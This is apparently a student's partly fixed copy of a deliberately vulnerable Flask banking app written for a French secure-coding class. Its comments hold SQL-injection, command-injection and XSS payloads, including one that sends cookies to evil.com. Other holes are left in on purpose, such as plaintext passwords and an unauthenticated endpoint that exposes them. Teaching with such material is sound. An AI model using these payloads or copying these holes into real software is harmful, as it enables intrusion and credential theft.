# ============================================================
#  YnovBank - Application Vulnérable pour TP Sécurité
#  YNOV CYBER - Séance 03 - Secure Coding
#  ⚠️  NE PAS DÉPLOYER EN PRODUCTION - Usage pédagogique uniquement
# ============================================================
#
#  INSTALLATION RAPIDE :
#  1. pip install flask
#  2. python ynovbank_vulnerable.py
#  3. Ouvrir http://localhost:5000
#
#  COMPTES DE TEST :
#  - alice / password123   (utilisateur)
#  - admin / Admin@2026!   (administrateur)
#
#  VULNÉRABILITÉS INTENTIONNELLES (5 failles à trouver) :
#  #1 - Secrets hardcodés (ligne ~30)
#  #2 - SQL Injection sur /login (ligne ~80)
#  #3 - SQL Injection sur /search (ligne ~100)
#  #4 - XSS Stocké sur /comment (ligne ~115)
#  #5 - OS Command Injection sur /ping (ligne ~135)
#  #6 - Mode debug activé en production (ligne ~180)
# ============================================================

from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
from markupsafe import escape
import sqlite3
import subprocess
import os

from pydantic import BaseModel, EmailStr, constr

class UserLogin(BaseModel):
    email: EmailStr  # Vérifie que c'est un vrai format email
    password: str

# On importe os et load_dotenv tout en haut du fichier
import os
from dotenv import load_dotenv

load_dotenv() # Cette ligne charge le fichier .env

app = Flask(__name__)

# ============================================================
#   REMÉDIATION #1 — GESTION DES SECRETS (SÉCURISÉ)
# ============================================================
app.secret_key    = os.getenv("SECRET_KEY")
SECRET_JWT        = os.getenv("SECRET_JWT")
AWS_ACCESS_KEY    = os.getenv("AWS_ACCESS_KEY")
AWS_SECRET        = os.getenv("AWS_SECRET")
DB_PASSWORD       = os.getenv("DB_PASSWORD")
SMTP_PASSWORD     = os.getenv("SMTP_PASSWORD")
STRIPE_API_KEY    = os.getenv("STRIPE_API_KEY")


# ============================================================
#  INITIALISATION DE LA BASE DE DONNÉES
# ============================================================
def init_db():
    """Crée et initialise la base de données SQLite."""
    conn = sqlite3.connect('bank.db')
    c = conn.cursor()

    # Table utilisateurs
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT    NOT NULL UNIQUE,
            password TEXT    NOT NULL,
            role     TEXT    DEFAULT 'user',
            balance  REAL    DEFAULT 0.0
        )
    ''')

    # Table commentaires
    c.execute('''
        CREATE TABLE IF NOT EXISTS comments (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            author    TEXT    NOT NULL,
            content   TEXT    NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Données de test
    c.execute("INSERT OR IGNORE INTO users (username, password, role, balance) VALUES (?, ?, ?, ?)",
              ("alice", "password123", "user", 5000.00))
    c.execute("INSERT OR IGNORE INTO users (username, password, role, balance) VALUES (?, ?, ?, ?)",
              ("admin", "Admin@2026!", "admin", 99999.00))
    c.execute("INSERT OR IGNORE INTO users (username, password, role, balance) VALUES (?, ?, ?, ?)",
              ("bob", "bob123", "user", 1500.00))

    conn.commit()
    conn.close()


def get_db():
    """Retourne une connexion à la base de données."""
    conn = sqlite3.connect('bank.db')
    conn.row_factory = sqlite3.Row
    return conn


# ============================================================
#  PAGE D'ACCUEIL
# ============================================================
@app.route('/')
def index():
    user = session.get('user', None)
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>YnovBank - Accueil</title>
        <style>
            body { font-family: Arial, sans-serif; background: #0f1117; color: #e8e8f0; margin: 0; padding: 20px; }
            .header { background: linear-gradient(135deg, #1a0533, #0d1b2a); padding: 20px; border-radius: 8px; margin-bottom: 20px; }
            .header h1 { color: #a78bfa; margin: 0; }
            .header p { color: #94a3b8; margin: 5px 0 0 0; font-size: 12px; }
            .card { background: #1e1e2e; border: 1px solid #2d2d44; border-radius: 8px; padding: 20px; margin: 10px 0; }
            .btn { display: inline-block; padding: 10px 20px; background: #6c3fc5; color: white; text-decoration: none; border-radius: 5px; margin: 5px; }
            .btn:hover { background: #7c4fd5; }
            .btn-red { background: #c53030; }
            .warning { background: #2a0a0a; border-left: 4px solid #e74c3c; padding: 15px; border-radius: 4px; margin: 10px 0; }
            .info { background: #0a1f3a; border-left: 4px solid #3b82f6; padding: 15px; border-radius: 4px; }
            .nav { background: #1e1e2e; padding: 10px 20px; border-radius: 8px; margin-bottom: 20px; }
            .nav a { color: #a78bfa; text-decoration: none; margin-right: 20px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🏦 YnovBank</h1>
            <p>⚠️ APPLICATION VOLONTAIREMENT VULNÉRABLE — USAGE PÉDAGOGIQUE UNIQUEMENT — TP YNOV CYBER SÉANCE 03</p>
        </div>
        <div class="nav">
            <a href="/">🏠 Accueil</a>
            <a href="/login">🔐 Connexion</a>
            <a href="/search">🔍 Recherche</a>
            <a href="/comments">💬 Commentaires</a>
            <a href="/ping">📡 Ping</a>
            {% if user %}<a href="/profile">👤 Profil ({{ user }})</a>{% endif %}
            {% if user %}<a href="/logout">🚪 Déconnexion</a>{% endif %}
        </div>
        
        <div class="warning">
            <strong>⚠️ AVERTISSEMENT PÉDAGOGIQUE</strong><br>
            Cette application contient des vulnérabilités intentionnelles pour des fins d'apprentissage.<br>
            Ne jamais déployer ce code en production. Usage réservé au TP YNOV Cybersécurité.
        </div>
        
        <div class="card">
            <h2>📋 Endpoints disponibles pour le TP</h2>
            <table style="width:100%; border-collapse:collapse;">
                <tr style="border-bottom:1px solid #2d2d44;">
                    <th style="text-align:left; padding:8px; color:#a78bfa;">Endpoint</th>
                    <th style="text-align:left; padding:8px; color:#a78bfa;">Méthode</th>
                    <th style="text-align:left; padding:8px; color:#a78bfa;">Description</th>
                    <th style="text-align:left; padding:8px; color:#a78bfa;">Vulnérabilité</th>
                </tr>
                <tr style="border-bottom:1px solid #1a1a2e;">
                    <td style="padding:8px;"><code>/login</code></td>
                    <td style="padding:8px;">GET / POST</td>
                    <td style="padding:8px;">Authentification</td>
                    <td style="padding:8px; color:#ef4444;">☠️ SQL Injection</td>
                </tr>
                <tr style="border-bottom:1px solid #1a1a2e;">
                    <td style="padding:8px;"><code>/search?name=</code></td>
                    <td style="padding:8px;">GET</td>
                    <td style="padding:8px;">Recherche utilisateur</td>
                    <td style="padding:8px; color:#ef4444;">☠️ SQL Injection</td>
                </tr>
                <tr style="border-bottom:1px solid #1a1a2e;">
                    <td style="padding:8px;"><code>/comment</code></td>
                    <td style="padding:8px;">POST</td>
                    <td style="padding:8px;">Poster un commentaire</td>
                    <td style="padding:8px; color:#ef4444;">☠️ XSS Stocké</td>
                </tr>
                <tr style="border-bottom:1px solid #1a1a2e;">
                    <td style="padding:8px;"><code>/comments</code></td>
                    <td style="padding:8px;">GET</td>
                    <td style="padding:8px;">Afficher commentaires</td>
                    <td style="padding:8px; color:#f97316;">⚠️ XSS Rendu</td>
                </tr>
                <tr style="border-bottom:1px solid #1a1a2e;">
                    <td style="padding:8px;"><code>/ping?host=</code></td>
                    <td style="padding:8px;">GET</td>
                    <td style="padding:8px;">Ping réseau</td>
                    <td style="padding:8px; color:#ef4444;">☠️ OS Cmd Injection</td>
                </tr>
            </table>
        </div>
        
        {% if user %}
        <div class="card">
            <p>✅ Connecté en tant que : <strong style="color:#a78bfa;">{{ user }}</strong></p>
        </div>
        {% endif %}
    </body>
    </html>
    '''
    return render_template_string(html, user=user)


# ============================================================
#  AUTHENTIFICATION - PAGE DE CONNEXION
# ============================================================
@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        email    = request.form.get('email', '')
        password = request.form.get('password', '')

        conn = get_db()
        c    = conn.cursor()

        # ============================================================
        # ☠️  VULNÉRABILITÉ #2 — SQL INJECTION
        #     La concaténation directe permet de manipuler la requête
        #     Payload : email = ' OR '1'='1'--
        #               email = ' OR 1=1--
        # ============================================================
        # ✅ CORRECTION : Utilisation de paramètres pour éviter l'injection SQL
        query = "SELECT * FROM users WHERE username = ? AND password = ?"
        c.execute(query, (email, password))
        user = c.fetchone()
        conn.close()

        if user:
            session['user']    = user['username']
            session['role']    = user['role']
            session['balance'] = user['balance']
            return redirect(url_for('profile'))
        else:
            error = "Identifiants incorrects."

    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>YnovBank - Connexion</title>
        <style>
            body { font-family: Arial, sans-serif; background: #0f1117; color: #e8e8f0;
                   display: flex; justify-content: center; align-items: center; min-height: 100vh; margin:0; }
            .login-box { background: #1e1e2e; border: 1px solid #2d2d44; border-radius: 12px;
                         padding: 40px; width: 400px; }
            h2 { color: #a78bfa; text-align: center; margin-bottom: 30px; }
            label { display: block; color: #94a3b8; margin-bottom: 5px; font-size: 14px; }
            input { width: 100%; padding: 10px; background: #0f1117; border: 1px solid #2d2d44;
                    border-radius: 5px; color: #e8e8f0; box-sizing: border-box; margin-bottom: 15px; }
            input:focus { outline: none; border-color: #6c3fc5; }
            button { width: 100%; padding: 12px; background: #6c3fc5; color: white;
                     border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            button:hover { background: #7c4fd5; }
            .error { background: #2a0a0a; border: 1px solid #e74c3c; color: #ef4444;
                     padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center; }
            .hint { background: #0a1f0a; border: 1px solid #2ecc71; color: #4ade80;
                    padding: 10px; border-radius: 5px; margin-top: 15px; font-size: 12px; }
            a { color: #a78bfa; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🏦 YnovBank — Connexion</h2>
            {% if error %}
            <div class="error">{{ error }}</div>
            {% endif %}
            <form method="POST">
                <label>Nom d'utilisateur</label>
                <input type="text" name="email" placeholder="alice" autocomplete="off">
                <label>Mot de passe</label>
                <input type="password" name="password" placeholder="••••••••">
                <button type="submit">Se connecter</button>
            </form>
            <div class="hint">
                💡 Comptes de test : alice / password123 &nbsp;|&nbsp; admin / Admin@2026!
            </div>
            <p style="text-align:center; margin-top:15px;"><a href="/">← Retour accueil</a></p>
        </div>
    </body>
    </html>
    '''
    return render_template_string(html, error=error)


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))


@app.route('/profile')
def profile():
    user = session.get('user')
    if not user:
        return redirect(url_for('login'))

    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>YnovBank - Profil</title>
        <style>
            body { font-family: Arial, sans-serif; background: #0f1117; color: #e8e8f0; padding: 20px; }
            .card { background: #1e1e2e; border: 1px solid #2d2d44; border-radius: 8px; padding: 20px; max-width: 600px; margin: 0 auto; }
            h2 { color: #a78bfa; }
            .balance { font-size: 2em; color: #4ade80; font-weight: bold; }
            .role-admin { color: #ef4444; font-weight: bold; }
            .role-user  { color: #94a3b8; }
            a { color: #a78bfa; }
            .nav { background: #1e1e2e; padding: 10px 20px; border-radius: 8px; margin-bottom: 20px; max-width: 600px; margin: 0 auto 20px auto; }
            .nav a { color: #a78bfa; text-decoration: none; margin-right: 20px; }
        </style>
    </head>
    <body>
        <div class="nav">
            <a href="/">🏠 Accueil</a>
            <a href="/search">🔍 Recherche</a>
            <a href="/comments">💬 Commentaires</a>
            <a href="/ping">📡 Ping</a>
            <a href="/logout">🚪 Déconnexion</a>
        </div>
        <div class="card">
            <h2>👤 Profil de {{ user }}</h2>
            <p>Rôle : <span class="{{ 'role-admin' if role == 'admin' else 'role-user' }}">{{ role.upper() }}</span></p>
            <p>Solde : <span class="balance">{{ "%.2f"|format(balance) }} €</span></p>
            {% if role == 'admin' %}
            <p style="color: #ef4444;">⚠️ Vous avez accès aux fonctions administrateur!</p>
            {% endif %}
        </div>
    </body>
    </html>
    '''
    return render_template_string(html,
                                   user=session.get('user'),
                                   role=session.get('role', 'user'),
                                   balance=session.get('balance', 0))


# ============================================================
#  RECHERCHE D'UTILISATEURS
# ============================================================
@app.route('/search')
def search():
    name    = request.args.get('name', '')
    results = []
    error   = None

    if name:
        conn = get_db()
        c    = conn.cursor()
        try:
            # ============================================================
            # ☠️  VULNÉRABILITÉ #3 — SQL INJECTION (UNION-BASED)
            #     Payload : ' UNION SELECT username,password,role,balance FROM users--
            #               ' OR '1'='1'--
            # ============================================================
            # ✅ CORRECTION : Requête paramétrée
            query = "SELECT username, role, balance FROM users WHERE username = ?"
            c.execute(query, (name,))
            results = c.fetchall()
        except Exception as e:
            # ☠️  VULNÉRABILITÉ BONUS — Error-based SQLi info disclosure
            error = f"Erreur DB : {str(e)}"
        conn.close()

    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>YnovBank - Recherche</title>
        <style>
            body { font-family: Arial, sans-serif; background: #0f1117; color: #e8e8f0; padding: 20px; }
            .card { background: #1e1e2e; border: 1px solid #2d2d44; border-radius: 8px; padding: 20px; max-width: 700px; margin: 0 auto; }
            h2 { color: #a78bfa; }
            input { padding: 10px; background: #0f1117; border: 1px solid #2d2d44; border-radius: 5px;
                    color: #e8e8f0; width: 300px; }
            button { padding: 10px 20px; background: #6c3fc5; color: white; border: none; border-radius: 5px; cursor: pointer; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th { color: #a78bfa; text-align: left; padding: 8px; border-bottom: 1px solid #2d2d44; }
            td { padding: 8px; border-bottom: 1px solid #1a1a2e; }
            .error { color: #ef4444; background: #2a0a0a; padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace; font-size: 12px; }
            .nav a { color: #a78bfa; text-decoration: none; margin-right: 20px; }
            a { color: #a78bfa; }
        </style>
    </head>
    <body>
        <div style="background:#1e1e2e;padding:10px 20px;border-radius:8px;margin-bottom:20px;">
            <a href="/">🏠 Accueil</a> &nbsp;
            <a href="/login">🔐 Connexion</a> &nbsp;
            <a href="/comments">💬 Commentaires</a> &nbsp;
            <a href="/ping">📡 Ping</a>
        </div>
        <div class="card">
            <h2>🔍 Recherche de compte</h2>
            <form method="GET">
                <input type="text" name="name" value="{{ name }}" placeholder="Nom d'utilisateur (ex: alice)">
                <button type="submit">Rechercher</button>
            </form>
            {% if error %}
            <div class="error">{{ error }}</div>
            {% endif %}
            {% if results %}
            <table>
                <tr><th>Utilisateur</th><th>Rôle</th><th>Solde</th></tr>
                {% for r in results %}
                <tr>
                    <td>{{ r[0] }}</td>
                    <td>{{ r[1] }}</td>
                    <td>{{ r[2] }} €</td>
                </tr>
                {% endfor %}
            </table>
            {% elif name %}
            <p style="color:#94a3b8;">Aucun résultat pour "{{ name }}".</p>
            {% endif %}
        </div>
    </body>
    </html>
    '''
    return render_template_string(html, name=name, results=results, error=error)


# ============================================================
#  COMMENTAIRES - XSS STOCKÉ
# ============================================================
@app.route('/comment', methods=['POST'])
def add_comment():
    data    = request.get_json() or {}
    author  = data.get('author', 'Anonyme')
    content = data.get('content', '')

    if not content:
        return jsonify({"status": "error", "message": "Contenu vide"}), 400

    conn = get_db()
    c    = conn.cursor()

    # ============================================================
    # ☠️  VULNÉRABILITÉ #4 — XSS STOCKÉ + SQL INJECTION
    #     Le contenu est stocké sans échappement ni validation
    #     Payload XSS : <script>alert('XSS YNOV TP!')</script>
    #     Payload avancé : <img src=x onerror="document.location='http://evil.com/?c='+document.cookie">
    # ✅ CORRECTION : On évite aussi l'injection SQL ici
    c.execute("INSERT INTO comments (author, content) VALUES (?, ?)", (author, content))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "stored": content})


@app.route('/comments')
def get_comments():
    conn = get_db()
    c    = conn.cursor()
    c.execute("SELECT author, content, timestamp FROM comments ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()

    # ============================================================
    # ☠️  VULNÉRABILITÉ #4 (suite) — RENDU XSS SANS ÉCHAPPEMENT
    #     Le contenu HTML est rendu directement dans la page
    # ============================================================
    comments_html = ""
    for row in rows:
        # ✅ CORRECTION : escape() transforme les balises <script> en texte inoffensif
        comments_html += f'''
        <div style="background:#1e1e2e; border:1px solid #2d2d44; border-radius:8px; 
                    padding:15px; margin:10px 0;">
            <strong style="color:#a78bfa;">👤 {escape(row[0])}</strong>
            <span style="color:#64748b; font-size:12px; margin-left:10px;">{row[2]}</span>
            <p style="margin:10px 0 0 0;">{escape(row[1])}</p>
        </div>
        '''

    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>YnovBank - Commentaires</title>
        <style>
            body {{ font-family: Arial, sans-serif; background: #0f1117; color: #e8e8f0; padding: 20px; }}
            .card {{ background: #1e1e2e; border: 1px solid #2d2d44; border-radius: 8px; padding: 20px; max-width: 700px; margin: 0 auto; }}
            h2 {{ color: #a78bfa; }}
            input, textarea {{ width: 100%; padding: 10px; background: #0f1117; border: 1px solid #2d2d44;
                      border-radius: 5px; color: #e8e8f0; box-sizing: border-box; margin-bottom: 10px; }}
            button {{ padding: 10px 20px; background: #6c3fc5; color: white; border: none; border-radius: 5px; cursor: pointer; }}
            .warning {{ background: #2a0a0a; border-left: 4px solid #e74c3c; padding: 10px; margin-bottom: 15px; font-size: 13px; }}
            a {{ color: #a78bfa; text-decoration: none; }}
        </style>
    </head>
    <body>
        <div style="background:#1e1e2e;padding:10px 20px;border-radius:8px;margin-bottom:20px;">
            <a href="/">🏠 Accueil</a> &nbsp;
            <a href="/login">🔐 Connexion</a> &nbsp;
            <a href="/search">🔍 Recherche</a> &nbsp;
            <a href="/ping">📡 Ping</a>
        </div>
        <div class="card">
            <h2>💬 Commentaires clients</h2>
            <div class="warning">
                ⚠️ Cette page affiche les commentaires sans échappement HTML → Vulnérable au XSS Stocké
            </div>
            <form onsubmit="postComment(event)">
                <input type="text" id="author" placeholder="Votre nom">
                <textarea id="content" rows="3" placeholder="Votre commentaire..."></textarea>
                <button type="submit">Publier</button>
            </form>
            <hr style="border-color:#2d2d44; margin:20px 0;">
            <div id="comments-list">
                {comments_html if comments_html else '<p style="color:#64748b;">Aucun commentaire pour l\'instant.</p>'}
            </div>
        </div>
        <script>
        async function postComment(e) {{
            e.preventDefault();
            const author  = document.getElementById('author').value  || 'Anonyme';
            const content = document.getElementById('content').value;
            if (!content) return;
            
            const resp = await fetch('/comment', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ author, content }})
            }});
            
            if (resp.ok) {{
                window.location.reload();
            }}
        }}
        </script>
    </body>
    </html>
    '''
    return html


# ============================================================
#  PING RÉSEAU - OS COMMAND INJECTION
# ============================================================
@app.route('/ping')
def ping():
    host   = request.args.get('host', '')
    output = None
    error  = None

    if host:
        # ============================================================
        # ☠️  VULNÉRABILITÉ #5 — OS COMMAND INJECTION
        #     shell=True + concaténation = injection de commandes OS
        #     Payload : 8.8.8.8; id
        #     Payload : 8.8.8.8; cat /etc/passwd
        #     Payload : 8.8.8.8 && whoami
        # ============================================================
        import re
        # 1. Validation Regex (Sécurité supplémentaire)
        if not re.match(r"^[a-zA-Z0-9.-]+$", host):
            return "Erreur : Caractères non autorisés détectés."

        # 2. LA CORRECTION CRITIQUE : 
        # On utilise une liste et shell=False (on ne touche plus à la f-string cmd)
        try:
            result = subprocess.run(
                ["ping", "-n", "2", host], 
                shell=False, 
                capture_output=True, 
                text=True, 
                timeout=10
            )
            output = result.stdout + result.stderr
        except Exception as e:
            output = f"Erreur système : {str(e)}"

    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>YnovBank - Ping</title>
        <style>
            body { font-family: Arial, sans-serif; background: #0f1117; color: #e8e8f0; padding: 20px; }
            .card { background: #1e1e2e; border: 1px solid #2d2d44; border-radius: 8px; padding: 20px; max-width: 700px; margin: 0 auto; }
            h2 { color: #a78bfa; }
            input { width: 400px; padding: 10px; background: #0f1117; border: 1px solid #2d2d44;
                    border-radius: 5px; color: #e8e8f0; }
            button { padding: 10px 20px; background: #6c3fc5; color: white; border: none; border-radius: 5px; cursor: pointer; }
            pre { background: #0f1117; border: 1px solid #2d2d44; border-radius: 5px;
                  padding: 15px; overflow-x: auto; color: #4ade80; font-size: 13px; white-space: pre-wrap; }
            a { color: #a78bfa; text-decoration: none; }
        </style>
    </head>
    <body>
        <div style="background:#1e1e2e;padding:10px 20px;border-radius:8px;margin-bottom:20px;">
            <a href="/">🏠 Accueil</a> &nbsp;
            <a href="/login">🔐 Connexion</a> &nbsp;
            <a href="/search">🔍 Recherche</a> &nbsp;
            <a href="/comments">💬 Commentaires</a>
        </div>
        <div class="card">
            <h2>📡 Outil de Ping Réseau</h2>
            <form method="GET">
                <input type="text" name="host" value="{{ host }}" placeholder="ex: 8.8.8.8 ou google.com">
                <button type="submit">Ping</button>
            </form>
            {% if output %}
            <h3 style="color:#94a3b8; margin-top:20px;">Résultat :</h3>
            <pre>{{ output }}</pre>
            {% endif %}
        </div>
    </body>
    </html>
    '''
    return render_template_string(html, host=host, output=output)


# ============================================================
#  API JSON - ENDPOINT SUPPLÉMENTAIRE
# ============================================================
@app.route('/api/users')
def api_users():
    """Endpoint API qui expose tous les utilisateurs sans auth."""
    conn = get_db()
    c    = conn.cursor()
    # ☠️  Pas d'authentification + exposition des mots de passe!
    c.execute("SELECT id, username, password, role, balance FROM users")
    rows = c.fetchall()
    conn.close()

    users = [{"id": r[0], "username": r[1], "password": r[2], "role": r[3], "balance": r[4]}
             for r in rows]
    return jsonify(users)


# ============================================================
#  DÉMARRAGE DE L'APPLICATION
# ============================================================
if __name__ == '__main__':
    print("=" * 60)
    print("  🏦 YnovBank - Application Vulnérable TP Sécurité")
    print("  ⚠️  NE PAS DÉPLOYER EN PRODUCTION")
    print("  📚 YNOV CYBER - Séance 03 - Secure Coding")
    print("=" * 60)
    print()
    print("  🔗 URL: http://localhost:5000")
    print("  👤 Comptes: alice/password123 | admin/Admin@2026!")
    print()
    print("  Endpoints TP:")
    print("  → /login    (SQL Injection)")
    print("  → /search   (SQL Injection + Error-based)")
    print("  → /comments (XSS Stocké)")
    print("  → /ping     (OS Command Injection)")
    print()
    init_db()

    # ☠️  VULNÉRABILITÉ #6 — debug=True en production
    #    Expose le debugger Werkzeug avec RCE possible
    app.run(debug=False, host='0.0.0.0', port=5000)
